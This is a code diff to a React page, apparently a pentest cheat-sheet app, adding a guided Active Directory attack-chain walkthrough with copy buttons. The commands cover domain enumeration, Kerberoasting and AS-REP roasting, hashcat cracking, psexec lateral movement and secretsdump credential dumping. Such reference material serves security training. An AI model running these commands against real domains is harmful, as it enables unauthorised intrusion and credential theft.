@@ -19,6 +19,56 @@ const ActiveDirectory = () => {
 
   const sections = [
     {
+      id: 'walkthrough',
+      title: 'Guided AD Attack Chain Walkthrough',
+      content: [
+        {
+          type: 'markdown',
+          value: 'Follow this step-by-step chain for a typical Active Directory attack. Expand each step for details and commands.'
+        },
+        {
+          type: 'step',
+          title: '1. Enumeration',
+          description: 'Enumerate users, groups, and computers in the domain.',
+          commands: [
+            { value: 'enum4linux -a <target>', description: 'Comprehensive AD enumeration' },
+            { value: 'ldapsearch -x -H ldap://<target> -s base', description: 'LDAP enumeration' },
+            { value: 'SharpHound.exe -c All', description: 'BloodHound collection (full AD recon)' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '2. Kerberoasting & AS-REP Roasting',
+          description: 'Extract service account hashes for offline cracking.',
+          commands: [
+            { value: 'Rubeus kerberoast', description: 'Kerberoasting with Rubeus' },
+            { value: 'Get-DomainUser -PreauthNotRequired', description: 'AS-REP Roasting (PowerView)' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '3. Crack Hashes',
+          description: 'Crack Kerberos hashes to obtain cleartext credentials.',
+          commands: [
+            { value: 'hashcat -m 13100 hash.txt wordlist.txt', description: 'Crack Kerberos hashes with hashcat' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '4. Lateral Movement & Privilege Escalation',
+          description: 'Use credentials for lateral movement and privilege escalation.',
+          commands: [
+            { value: 'psexec.py <user>:<pass>@<target>', description: 'Lateral movement with psexec' },
+            { value: 'secretsdump.py <user>:<pass>@<target>', description: 'Dump hashes from remote system' }
+          ]
+        },
+        {
+          type: 'markdown',
+          value: '**Tip:** After each step, check for new credentials and document your findings!'
+        }
+      ]
+    },
+    {
       id: 'enum',
       title: 'Enumeration',
       content: [
@@ -94,13 +144,42 @@ SharpHound.exe -c All
             >
               {expandedSection === section.id && (
                 <div className="content-inner">
-                  {section.content.map((item, index) => (
-                    <div key={index} className="content-item">
-                      <div className="markdown-content">
-                        <ReactMarkdown>{item.value}</ReactMarkdown>
-                      </div>
-                    </div>
-                  ))}
+                  {section.content.map((item, index) => {
+                    if (item.type === 'step') {
+                      return (
+                        <div key={index} className="content-item walkthrough-step">
+                          <div className="step-header">
+                            <strong>{item.title}</strong>
+                          </div>
+                          <div className="step-description">{item.description}</div>
+                          <div className="step-commands">
+                            {item.commands.map((cmd, i) => (
+                              <div key={i} className="command-item">
+                                <div className="command-header">
+                                  <code>{cmd.value}</code>
+                                  <button
+                                    onClick={() => handleCopy(cmd.value)}
+                                    className="copy-button small"
+                                  >
+                                    Copy
+                                  </button>
+                                </div>
+                                <p className="command-description">{cmd.description}</p>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    } else {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="markdown-content">
+                            <ReactMarkdown>{item.value}</ReactMarkdown>
+                          </div>
+                        </div>
+                      );
+                    }
+                  })}
                 </div>
               )}
             </motion.div>
